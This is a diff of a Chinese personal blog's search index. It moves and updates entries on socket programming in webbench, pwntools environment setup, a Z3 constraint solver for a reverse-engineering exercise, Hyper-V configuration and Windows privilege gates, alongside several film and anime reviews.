-<p>而有数据边界则恰恰相反，收发的连接双方在线程操作buf的次数和相对行为上必须同步，同时收发包的顺序无法做到相同</p>
-<h2 id="面向socks协议栈开发">面向socks协议栈开发</h2>
-<p>代码中出现了一堆底层类和结构体，正好学一下TCP协议，之前草草学过一点点，基本就只知道了个DHCP。。。</p>
-<p>sockaddr_in结构体</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct sockaddr_in &#123;</span><br><span class="line">               sa_family_t    sin_family; /* address family: AF_INET */ 指明协议（实际上这个结构体是专门用于IPv4的）</span><br><span class="line">               in_port_t      sin_port;   /* port in network byte order */指明端口</span><br><span class="line">               struct in_addr sin_addr;   /* internet address */指明地址</span><br><span class="line"></span><br><span class="line">               //某些版本的源码中,此处另有八个字节的零位对齐</span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           struct in_addr &#123;</span><br><span class="line">               uint32_t       s_addr;     /* address in network byte order */只能IPv4</span><br><span class="line">           &#125;;</span><br></pre></td></tr></table></figure>
-<p>文档如下</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172115948.png" /></p>
-<p>hostent结构体</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct hostent &#123;</span><br><span class="line">char *h_name; //域名字符串</span><br><span class="line">char **h_aliases;  //别名字符串</span><br><span class="line">int h_addrtype;//IPv4</span><br><span class="line">int h_length;</span><br><span class="line">char **h_addr_list;</span><br><span class="line">// 网络字节序的IP地址</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>写完注释的fSocks函数如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int fSocket(const char *host, int clientPort)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int sock;</span><br><span class="line">    unsigned long inaddr;//二进制形式地址</span><br><span class="line">    struct sockaddr_in ad;//存放地址</span><br><span class="line">    struct hostent *hp;</span><br><span class="line">    </span><br><span class="line">    memset(&amp;ad, 0, sizeof(ad)); //分配内存</span><br><span class="line">    ad.sin_family = AF_INET;  //IPv4</span><br><span class="line"></span><br><span class="line">    inaddr = inet_addr(host);//将地址字符串转二进制形式的地址</span><br><span class="line">    if (inaddr != INADDR_NONE)//INADDR_NONE报错,如果输入非法IP字符串255 IP,都会出现该报错</span><br><span class="line">        memcpy(&amp;ad.sin_addr, &amp;inaddr, sizeof(inaddr));</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        hp = gethostbyname(host);//接收到exception为INADDR_NONE的IP,尝试解析该IP</span><br><span class="line">        if (hp == NULL)//无法解析IP,证明IP错误</span><br><span class="line">            return -1;</span><br><span class="line">        memcpy(&amp;ad.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);//可以向DNS解析IP,IP正确</span><br><span class="line">    &#125;</span><br><span class="line">    ad.sin_port = htons(clientPort);//把int型转换为网络传输字节型</span><br><span class="line">    </span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM, 0);//建立IPv4,流格式,TCP数据连接,获取连接FD</span><br><span class="line">    if (connect(sock, (struct sockaddr *)&amp;ad, sizeof(ad)) &lt; 0)//double check Link exist</span><br><span class="line">        return -1;</span><br><span class="line">    return sock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>之后就是主体部分了</p>
+    <title>webbench源码分析与程序改进及SOCKS网络协议笔记 （3）main文件解析</title>
+    <url>/webbench-yuan-ma-fen-xi-yu-cheng-xu-gai-jin-ji-socks-wang-luo-xie-yi-bi-ji-3-main-wen-jian/</url>
+    <content><![CDATA[<p>通读了一遍 主要逻辑是</p>
+<p>通过分支选择来append字符串，然后发出去</p>
+<p>fork与sleep的配合精确控制child数量，同时保证只有一层child关系</p>
+<p>粗略看完一遍感觉封装度太高了，宏观层面看起来很简单</p>
+<p>拓展POST功能这茬子事先放一放，先更新pwnable靶场的通关WP</p>
 ]]></content>
       <categories>
         <category>信息安全</category>
-        <category>二进制</category>
         <category>笔记</category>
+        <category>二进制</category>
         <category>开发</category>
         <category>存档</category>
         <category>网络</category>
@@ -2410,6 +2412,34 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053606
         <category>校内</category>
         <category>数据结构</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Windows PyCharm远程解释Linux PWNtools配置过程</title>
+    <url>/windows-pycharm-yuan-cheng-jie-shi-linux-pwntools-pei-zhi-guo-cheng/</url>
+    <content><![CDATA[<h2 id="背景">背景</h2>
+<p>在虚拟机Linux写脚本实在是太蛋疼了，虚拟机外面Windows写的话，又没有pwntool语法高亮，物理机Linux虽然笔者自己用着挺舒服，但是时不时就会需要用一下Windows独占应用，比如腾讯课堂这种沙雕玩意，对wine优化也不够好</p>
+<p>最后配置了一下远程python解释器，pwntool挂在服务器上，有些ssh和nc操作直接走服务器专线带宽，更容易ping通</p>
+<h2 id="正文">正文</h2>
+<p>查文章的时候看到前人的文章里面有很多报错，意外的是笔者自己没遇到任何问题</p>
+<p>直接在解释器里面点击添加解释器-添加SSH</p>
+<p>然后一直下一步就好了</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053542.png" /></p>
+<h2 id="补充">补充</h2>
+<p>pwntool的ssh等连接命令的输出会有一个转啊转的ASCII动画</p>
+<p>pycharm不支持显示那玩意</p>
+<p>会直接卡死</p>
+<p>笔者现在最优解是VScode配置remote develop，用下来没啥问题，很舒服</p>
+<p>就是在切换VPN的时候会抽风一下，GitHub上面找到有人反馈了一下，但是微软没搭理emmm</p>
+<p>总的来说小问题</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>存档</category>
+      </categories>
+      <tags>
+        <tag>环境配置</tag>
+      </tags>
   </entry>
   <entry>
     <title>why ebp is empty while gcc compiled with -ggdb  arg(without optimization)</title>
@@ -2457,34 +2487,6 @@ fn</p>
       </categories>
       <tags>
         <tag>Windows API</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows PyCharm远程解释Linux PWNtools配置过程</title>
-    <url>/windows-pycharm-yuan-cheng-jie-shi-linux-pwntools-pei-zhi-guo-cheng/</url>
-    <content><![CDATA[<h2 id="背景">背景</h2>
-<p>在虚拟机Linux写脚本实在是太蛋疼了，虚拟机外面Windows写的话，又没有pwntool语法高亮，物理机Linux虽然笔者自己用着挺舒服，但是时不时就会需要用一下Windows独占应用，比如腾讯课堂这种沙雕玩意，对wine优化也不够好</p>
-<p>最后配置了一下远程python解释器，pwntool挂在服务器上，有些ssh和nc操作直接走服务器专线带宽，更容易ping通</p>
-<h2 id="正文">正文</h2>
-<p>查文章的时候看到前人的文章里面有很多报错，意外的是笔者自己没遇到任何问题</p>
-<p>直接在解释器里面点击添加解释器-添加SSH</p>
-<p>然后一直下一步就好了</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053542.png" /></p>
-<h2 id="补充">补充</h2>
-<p>pwntool的ssh等连接命令的输出会有一个转啊转的ASCII动画</p>
-<p>pycharm不支持显示那玩意</p>
-<p>会直接卡死</p>
-<p>笔者现在最优解是VScode配置remote develop，用下来没啥问题，很舒服</p>
-<p>就是在切换VPN的时候会抽风一下，GitHub上面找到有人反馈了一下，但是微软没搭理emmm</p>
-<p>总的来说小问题</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>存档</category>
-      </categories>
-      <tags>
-        <tag>环境配置</tag>
       </tags>
   </entry>
   <entry>
@@ -2582,41 +2584,6 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172110253
       </categories>
   </entry>
   <entry>
-    <title>Z3py库解逆向工程题目</title>
-    <url>/z3py-ku-jie-ni-xiang-gong-cheng-ctf/</url>
-    <content><![CDATA[<h2 id="正文">正文</h2>
-<p>先安装，建议用whl手动安装而非apt、pip，同时注意给管理员权限，以免初始化失败</p>
-<p>然后有几个z3的坑点，一个是bitvector和bitvectors这类变量，一个是单数一个是复数</p>
-<p>如果一次性初始化很多变量就用带s的</p>
-<p>同时注意只有bitvector才可以进行位运算</p>
-<p>初始化变量时，建议把传参字符串和外部变量名统一，如果不统一有可能可以解释器通过，但是一定会对编辑器的语法高亮造成一定困扰</p>
-<p>另外，需要先check才能打印结果，在命令行中结果可以直接输出，但是在编辑器界面需要加一句print</p>
-<h2 id="示例">示例</h2>
-<p>（2023年3月18日更新：示例文件链接丢失）</p>
-<p>首先是通过简单分析发现一系列很深的函数</p>
-<p>通过查看Num1和Num2的xref发现只有四个函数对他们进行了特殊操作</p>
-<p>这个想法是这样的：</p>
-<p>首先理解ecx是this指针，然后观察xref里面哪个寄存器出现了很多次，就首先排除与那个寄存器相关的操作，因为这个操作大概率是 duplicated，然后注意观察cmp调用</p>
-<p>最终选出四个约束函数</p>
-<p>添加到z3里面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x,y=BitVecs(&#x27;x y&#x27;,32)</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(y/2-x == -107702)</span><br><span class="line">s.add(y &amp; 1 == 0)</span><br><span class="line">s.add(y ^ 333509 == x)</span><br><span class="line">s.add(881778^666&gt;=y)</span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure>
-<p>顺便说一下from xxx import *</p>
-<p>和</p>
-<p>import xxx的区别</p>
-<p>前者相当于include -r</p>
-<p>后者相当于include --none</p>
-<p>从学习py开始困扰我的问题终于解决了。。。</p>
-]]></content>
-      <categories>
-        <category>信息安全</category>
-        <category>二进制</category>
-        <category>逆向</category>
-      </categories>
-      <tags>
-        <tag>Z3py</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>枚举,结构体,yield return与多线程通信</title>
     <url>/yield-return/</url>
     <content><![CDATA[<h2 id="背景">背景</h2>
@@ -2660,6 +2627,41 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049147
       </categories>
   </entry>
   <entry>
+    <title>Z3py库解逆向工程题目</title>
+    <url>/z3py-ku-jie-ni-xiang-gong-cheng-ctf/</url>
+    <content><![CDATA[<h2 id="正文">正文</h2>
+<p>先安装，建议用whl手动安装而非apt、pip，同时注意给管理员权限，以免初始化失败</p>
+<p>然后有几个z3的坑点，一个是bitvector和bitvectors这类变量，一个是单数一个是复数</p>
+<p>如果一次性初始化很多变量就用带s的</p>
+<p>同时注意只有bitvector才可以进行位运算</p>
+<p>初始化变量时，建议把传参字符串和外部变量名统一，如果不统一有可能可以解释器通过，但是一定会对编辑器的语法高亮造成一定困扰</p>
+<p>另外，需要先check才能打印结果，在命令行中结果可以直接输出，但是在编辑器界面需要加一句print</p>
+<h2 id="示例">示例</h2>
+<p>（2023年3月18日更新：示例文件链接丢失）</p>
+<p>首先是通过简单分析发现一系列很深的函数</p>
+<p>通过查看Num1和Num2的xref发现只有四个函数对他们进行了特殊操作</p>
+<p>这个想法是这样的：</p>
+<p>首先理解ecx是this指针，然后观察xref里面哪个寄存器出现了很多次，就首先排除与那个寄存器相关的操作，因为这个操作大概率是 duplicated，然后注意观察cmp调用</p>
+<p>最终选出四个约束函数</p>
+<p>添加到z3里面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x,y=BitVecs(&#x27;x y&#x27;,32)</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(y/2-x == -107702)</span><br><span class="line">s.add(y &amp; 1 == 0)</span><br><span class="line">s.add(y ^ 333509 == x)</span><br><span class="line">s.add(881778^666&gt;=y)</span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure>
+<p>顺便说一下from xxx import *</p>
+<p>和</p>
+<p>import xxx的区别</p>
+<p>前者相当于include -r</p>
+<p>后者相当于include --none</p>
+<p>从学习py开始困扰我的问题终于解决了。。。</p>
+]]></content>
+      <categories>
+        <category>信息安全</category>
+        <category>二进制</category>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>Z3py</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>《凪明》影评</title>
     <url>/ci-ming-ying-ping/</url>
     <content><![CDATA[<p>第一次看的时候年龄太小了，完全没看懂恋爱情节的核心内容，只是觉得画风很好，绘制精度很高（在当年水准下），有很多用来炫技的水陆交汇场景以及第十二集突然的情节急转，编剧nb，至于恋爱的部分反而倒是其次的，没留下太深印象</p>
@@ -2685,37 +2687,6 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049147
         <category>点评</category>
         <category>ACG</category>
       </categories>
-  </entry>
-  <entry>
-    <title>《哈利波特》二周目点评</title>
-    <url>/ha-li-bo-te-er-zhou-mu-dian-ping/</url>
-    <content><![CDATA[<p>这tm是儿童文学？？</p>
-<p>当年看的时候完全没有理解一些内核</p>
-<p>这tm明明是隐喻白左与美国右翼党争的政治作品，魔法部后期是左，哈利波特是右</p>
-<p>伏地魔隐喻的就是共党</p>
-<p>我看完之后还怕搞错了，结果发现网上分析这个的一抓一大把，我这才确定了我的观点</p>
-<p>而且情感线的描写小孩真的能看懂？反正我当年没看懂，不过现在我觉得那些描写太真实了，是本人</p>
-<p>同时吃设定，吃书，OOC太严重，明明是魔法师非要搞物理攻击，某些人物的性格前后差异太大</p>
-<p>单从文学水平来说，唯一值得称赞，且做到几乎完美的部分，只有关于《什么是青春》这个问题的描写</p>
-<p>所有可以展现青春的细节的描写，现在看来都太真实了，都是一些再也不会有的经历，纯粹的青春</p>
-<p>我只能说，这个系列是夹带私货的，表面迎合了15岁以下青少年的，商业上也认可了这种迎合的，不停吃设定的架空作品</p>
-<p>个人点评7.5分，评这个“良好”级别的分数主要原因是青春描写和一些正面价值观的描写，个人认为，这几乎是这个系列当中，真正对青少年有营养的部分，不过还是占比挺大的，而且也确实是核心之一</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172052622.jpeg" /></p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172052294.jpeg" /></p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172052390.jpeg" /></p>
-]]></content>
-      <categories>
-        <category>杂谈</category>
-        <category>点评</category>
-      </categories>
-      <tags>
-        <tag>电影</tag>
-        <tag>点评</tag>
-        <tag>有剧透</tag>
-      </tags>
   </entry>
   <entry>
     <title>家用路由器0day挖掘笔记（1）MIPS32平台逆向入门指南</title>
@@ -2842,6 +2813,37 @@ class="math inline">\(0,\)</span>t1——与0相加；由于某些底层设计�
       </categories>
   </entry>
   <entry>
+    <title>《哈利波特》二周目点评</title>
+    <url>/ha-li-bo-te-er-zhou-mu-dian-ping/</url>
+    <content><![CDATA[<p>这tm是儿童文学？？</p>
+<p>当年看的时候完全没有理解一些内核</p>
+<p>这tm明明是隐喻白左与美国右翼党争的政治作品，魔法部后期是左，哈利波特是右</p>
+<p>伏地魔隐喻的就是共党</p>
+<p>我看完之后还怕搞错了，结果发现网上分析这个的一抓一大把，我这才确定了我的观点</p>
+<p>而且情感线的描写小孩真的能看懂？反正我当年没看懂，不过现在我觉得那些描写太真实了，是本人</p>
+<p>同时吃设定，吃书，OOC太严重，明明是魔法师非要搞物理攻击，某些人物的性格前后差异太大</p>
+<p>单从文学水平来说，唯一值得称赞，且做到几乎完美的部分，只有关于《什么是青春》这个问题的描写</p>
+<p>所有可以展现青春的细节的描写，现在看来都太真实了，都是一些再也不会有的经历，纯粹的青春</p>
+<p>我只能说，这个系列是夹带私货的，表面迎合了15岁以下青少年的，商业上也认可了这种迎合的，不停吃设定的架空作品</p>
+<p>个人点评7.5分，评这个“良好”级别的分数主要原因是青春描写和一些正面价值观的描写，个人认为，这几乎是这个系列当中，真正对青少年有营养的部分，不过还是占比挺大的，而且也确实是核心之一</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172052622.jpeg" /></p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172052294.jpeg" /></p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172052390.jpeg" /></p>
+]]></content>
+      <categories>
+        <category>杂谈</category>
+        <category>点评</category>
+      </categories>
+      <tags>
+        <tag>电影</tag>
+        <tag>点评</tag>
+        <tag>有剧透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>《波斯语课》影评</title>
     <url>/bo-si-yu-ke-ying-ping/</url>
     <content><![CDATA[<p>（无剧透）</p>
@@ -2867,29 +2869,6 @@ class="math inline">\(0,\)</span>t1——与0相加；由于某些底层设计�
         <tag>点评</tag>
         <tag>无剧透</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>《真实之泪》影评</title>
-    <url>/zhen-shi-zhi-lei-ying-ping/</url>
-    <content><![CDATA[<p>青春物语的内核都不是给青春期的学生看的</p>
-<p>不过从某种意义上来说，受众范围广的作品确实很适合作为广为流传的经典</p>
-<p>看青春剧就总是有一种，觉得曾经的自己很悲哀的感觉，不论是机遇上的还是自身能力上的，抑或是行为处事太天真，看到悲剧（某种意义上）的主人公就像曾经的自己真的很悲哀</p>
-<p>本剧还有一点很深刻的感悟</p>
-<p>客观的话语不能在主观的环境下说出</p>
-<p>这里的不能指的是社会性不能</p>
-<h2 id="补充1">补充1</h2>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181100065.png" /></p>
-<p>这个挺真实的2333</p>
-<p>个人经验来说，意外看到女生裸体的话，我觉得还是有相当一部分（即使处于青春期的）男生，和男主这种反应差不多，我之前也差不多是这个反应，然后对方和女主反应也差不多</p>
-<p>大部分番当中的尖叫，现实中感觉不太可能（如果对方也意识到是不可抗力的话）</p>
-<p>这个算是唯一一个我看过的番里面，没有尖叫的233</p>
-]]></content>
-      <categories>
-        <category>杂谈</category>
-        <category>点评</category>
-        <category>ACG</category>
-      </categories>
   </entry>
   <entry>
     <title>《编译、链接与装载》笔记(2)锁,互斥量,原子操作</title>
@@ -2933,6 +2912,29 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181100065
       </categories>
   </entry>
   <entry>
+    <title>《真实之泪》影评</title>
+    <url>/zhen-shi-zhi-lei-ying-ping/</url>
+    <content><![CDATA[<p>青春物语的内核都不是给青春期的学生看的</p>
+<p>不过从某种意义上来说，受众范围广的作品确实很适合作为广为流传的经典</p>
+<p>看青春剧就总是有一种，觉得曾经的自己很悲哀的感觉，不论是机遇上的还是自身能力上的，抑或是行为处事太天真，看到悲剧（某种意义上）的主人公就像曾经的自己真的很悲哀</p>
+<p>本剧还有一点很深刻的感悟</p>
+<p>客观的话语不能在主观的环境下说出</p>
+<p>这里的不能指的是社会性不能</p>
+<h2 id="补充1">补充1</h2>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181100065.png" /></p>
+<p>这个挺真实的2333</p>
+<p>个人经验来说，意外看到女生裸体的话，我觉得还是有相当一部分（即使处于青春期的）男生，和男主这种反应差不多，我之前也差不多是这个反应，然后对方和女主反应也差不多</p>
+<p>大部分番当中的尖叫，现实中感觉不太可能（如果对方也意识到是不可抗力的话）</p>
+<p>这个算是唯一一个我看过的番里面，没有尖叫的233</p>
+]]></content>
+      <categories>
+        <category>杂谈</category>
+        <category>点评</category>
+        <category>ACG</category>
+      </categories>
+  </entry>
+  <entry>
     <title>《编译、链接与装载》笔记(4)CPU乱序执行的一些细节行为，以及会引发的问题</title>
     <url>/bian-yi-lian-jie-yu-zhuang-zai-bi-ji-4cpu-luan-xu-zhi-xing-de-yi-xie-xi-jie/</url>
     <content><![CDATA[<p>源码</p>
@@ -2952,6 +2954,18 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172053290
 ]]></content>
       <categories>
         <category>硬件</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>《让子弹飞》影评</title>
+    <url>/rang-zi-dan-fei-ying-ping/</url>
+    <content><![CDATA[<p>能让人有过度解读欲望的艺术作品才能算是完满的艺术作品，才有资格被称作是艺术，这是我至始至终对艺术一词的看法</p>
+<p>但这不意味着艺术作品应当脱离创作者的主观意愿被过度解读</p>
+<p>《让子弹飞》便是一个典型</p>
+]]></content>
+      <categories>
+        <category>杂谈</category>
+        <category>点评</category>
       </categories>
   </entry>
   <entry>
@@ -2994,6 +3008,19 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172053290
       </categories>
   </entry>
   <entry>
+    <title>一些电路元件笔记</title>
+    <url>/yi-xie-dian-lu-yuan-jian-bi-ji/</url>
+    <content><![CDATA[<h2 id="并行加法器">并行加法器</h2>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172111930.png" /></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>校内</category>
+        <category>计组</category>
+      </categories>
+  </entry>
+  <entry>
     <title>一些待研究底层原理的宏观现象</title>
     <url>/yi-xie-dai-yan-jiu-di-ceng-yuan-li-de-hong-guan-xian-xiang/</url>
     <content><![CDATA[<ul>
@@ -3011,64 +3038,6 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172053290
       </categories>
       <tags>
         <tag>悬而未决</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《让子弹飞》影评</title>
-    <url>/rang-zi-dan-fei-ying-ping/</url>
-    <content><![CDATA[<p>能让人有过度解读欲望的艺术作品才能算是完满的艺术作品，才有资格被称作是艺术，这是我至始至终对艺术一词的看法</p>
-<p>但这不意味着艺术作品应当脱离创作者的主观意愿被过度解读</p>
-<p>《让子弹飞》便是一个典型</p>
-]]></content>
-      <categories>
-        <category>杂谈</category>
-        <category>点评</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>一些电路元件笔记</title>
-    <url>/yi-xie-dian-lu-yuan-jian-bi-ji/</url>
-    <content><![CDATA[<h2 id="并行加法器">并行加法器</h2>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172111930.png" /></p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>校内</category>
-        <category>计组</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>为什么hyper-V和VM conflict</title>
-    <url>/wei-shi-me-hyper-v-he-vm-conflict/</url>
-    <content><![CDATA[<p>如果开了hyper-v那么整台Windows物理机都是hyper-V虚拟化的,hyper-v的效率和一台普通物理机的效率是差不多的</p>
-<p>而对于VM来说就相当于运行在虚拟机里面</p>
-<p>所以报错,不能双重虚拟化</p>
-<p>比较麻烦的解决方法是</p>
-<blockquote>
-<p>如果要用VMware，暂时关闭Hyper-v或沙盒功能，命令如下：<br />
-（1）以管理员身份（win + x）运行命令提示符；<br />
-（2）执行命令：bcdedit /set hypervisorlaunchtype off<br />
-（3）重启系统，运行vm即可。</p>
-<p>如果要恢复使用沙盒功能：<br />
-（1）以管理员身份（win + x）运行命令提示符；<br />
-（2）执行命令：bcdedit / set hypervisorlaunchtype auto<br />
-（3）重启系统，运行Sandbox即可。</p>
-<p>作者：WHOANIl<br />
-链接：https://www.jianshu.com/p/73ccf4af4a67<br />
-来源：简书<br />
-著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
-</blockquote>
-<p>一般沙盒就用来测试不安全软件的</p>
-<p>所以一般保持关闭即可</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>存档</category>
-      </categories>
-      <tags>
-        <tag>环境配置</tag>
-        <tag>虚拟化</tag>
       </tags>
   </entry>
   <entry>
@@ -3123,31 +3092,37 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172108648
       </categories>
   </entry>
   <entry>
-    <title>Windows权限保护机制与权限门机制</title>
-    <url>/er-jin-zhi-za-wen-4-windows-quan-xian-bao-hu-ji-zhi-yu-quan-xian-men-ji-zhi/</url>
-    <content><![CDATA[<p>思考一个问题</p>
-<p>高权限的,一旦使用就会造成一定安全隐患的函数,API如何能安全分配给其他子程序使用权限?(把操作系统本身看作主程序,其他程序看作子程序)</p>
-<p>换句话来说,低权限的程序如何能安全获取高权限程序(API可以看作是子例,也就是广义的程序)的使用权</p>
-<p>首先,普通的程序员写的程序代码都是ring3的,如果调用int 80h
-之类的指令,则需要陷入ring0,这样就获取了高优先级,如何保证这一高优先级权限在生命周期开始时正确借出,并在结束时正确归还,以及如何借出,如何归还就成为了一个重要问题</p>
-<p>首先在保护模式下,所有高权限的,但是允许低权限调用的程序,都有唯一的门</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101378.png" /></p>
-<p>门储存在中断向量表里</p>
-<p>中断向量表当中的每一个内存单元储存唯一固定的指针,指向唯一固定的dll</p>
-<p><img
-src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049935.png" /></p>
-<p>一旦程序需要调用高权限程序,只能通过这唯一固定的门</p>
-<p>而且在操作系统底层拒绝了覆写这段区域的行为,换句话来说这些门不可能被违规改造</p>
-<p>这样就建立了安全的分发机制</p>
-<p>另外,我们实际上在现代的win32汇编程序当中见不到int中断指令,因为所有int指令都有对应的dll封装</p>
-<p>至于unix内核笔者目前不清楚为什么int使用如此广泛</p>
-<p>至于归还权限,只需要在这些中断处置程序的出口点利用ring0的高权限强行修改DS,CS,SS寄存器的相关内容即可</p>
+    <title>为什么hyper-V和VM conflict</title>
+    <url>/wei-shi-me-hyper-v-he-vm-conflict/</url>
+    <content><![CDATA[<p>如果开了hyper-v那么整台Windows物理机都是hyper-V虚拟化的,hyper-v的效率和一台普通物理机的效率是差不多的</p>
+<p>而对于VM来说就相当于运行在虚拟机里面</p>
+<p>所以报错,不能双重虚拟化</p>
+<p>比较麻烦的解决方法是</p>
+<blockquote>
+<p>如果要用VMware，暂时关闭Hyper-v或沙盒功能，命令如下：<br />
+（1）以管理员身份（win + x）运行命令提示符；<br />
+（2）执行命令：bcdedit /set hypervisorlaunchtype off<br />
+（3）重启系统，运行vm即可。</p>
+<p>如果要恢复使用沙盒功能：<br />
+（1）以管理员身份（win + x）运行命令提示符；<br />
+（2）执行命令：bcdedit / set hypervisorlaunchtype auto<br />
+（3）重启系统，运行Sandbox即可。</p>
+<p>作者：WHOANIl<br />
+链接：https://www.jianshu.com/p/73ccf4af4a67<br />
+来源：简书<br />
+著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
+</blockquote>
+<p>一般沙盒就用来测试不安全软件的</p>
+<p>所以一般保持关闭即可</p>
 ]]></content>
       <categories>
         <category>笔记</category>
         <category>存档</category>
       </categories>
+      <tags>
+        <tag>环境配置</tag>
+        <tag>虚拟化</tag>
+      </tags>
   </entry>
   <entry>
     <title>如何使可以正常运行的PE文件后缀直接改为zip后同时还能正常解压</title>
@@ -3201,12 +3176,30 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181055415
       </categories>
   </entry>
   <entry>
-    <title>马尔科夫链笔记</title>
-    <url>/shi-me-shi-ma-er-ke-fu-lian/</url>
-    <content><![CDATA[<p>状态出口与状态保持的概率仅与当前状态有关，且与先前的任一状态均无关的状态机就是马尔科夫链</p>
+    <title>Windows权限保护机制与权限门机制</title>
+    <url>/er-jin-zhi-za-wen-4-windows-quan-xian-bao-hu-ji-zhi-yu-quan-xian-men-ji-zhi/</url>
+    <content><![CDATA[<p>思考一个问题</p>
+<p>高权限的,一旦使用就会造成一定安全隐患的函数,API如何能安全分配给其他子程序使用权限?(把操作系统本身看作主程序,其他程序看作子程序)</p>
+<p>换句话来说,低权限的程序如何能安全获取高权限程序(API可以看作是子例,也就是广义的程序)的使用权</p>
+<p>首先,普通的程序员写的程序代码都是ring3的,如果调用int 80h
+之类的指令,则需要陷入ring0,这样就获取了高优先级,如何保证这一高优先级权限在生命周期开始时正确借出,并在结束时正确归还,以及如何借出,如何归还就成为了一个重要问题</p>
+<p>首先在保护模式下,所有高权限的,但是允许低权限调用的程序,都有唯一的门</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172101378.png" /></p>
+<p>门储存在中断向量表里</p>
+<p>中断向量表当中的每一个内存单元储存唯一固定的指针,指向唯一固定的dll</p>
+<p><img
+src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181049935.png" /></p>
+<p>一旦程序需要调用高权限程序,只能通过这唯一固定的门</p>
+<p>而且在操作系统底层拒绝了覆写这段区域的行为,换句话来说这些门不可能被违规改造</p>
+<p>这样就建立了安全的分发机制</p>
+<p>另外,我们实际上在现代的win32汇编程序当中见不到int中断指令,因为所有int指令都有对应的dll封装</p>
+<p>至于unix内核笔者目前不清楚为什么int使用如此广泛</p>
+<p>至于归还权限,只需要在这些中断处置程序的出口点利用ring0的高权限强行修改DS,CS,SS寄存器的相关内容即可</p>
 ]]></content>
       <categories>
-        <category>黑历史与垃圾</category>
+        <category>笔记</category>
+        <category>存档</category>
       </categories>
   </entry>
   <entry>
@@ -3224,8 +3217,17 @@ src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181055415
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f = lambda x: x * x</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>杂谈</category>
         <category>开发</category>
+        <category>杂谈</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>马尔科夫链笔记</title>
+    <url>/shi-me-shi-ma-er-ke-fu-lian/</url>
+    <content><![CDATA[<p>状态出口与状态保持的概率仅与当前状态有关，且与先前的任一状态均无关的状态机就是马尔科夫链</p>
+]]></content>
+      <categories>
+        <category>黑历史与垃圾</category>
       </categories>
   </entry>
   <entry>
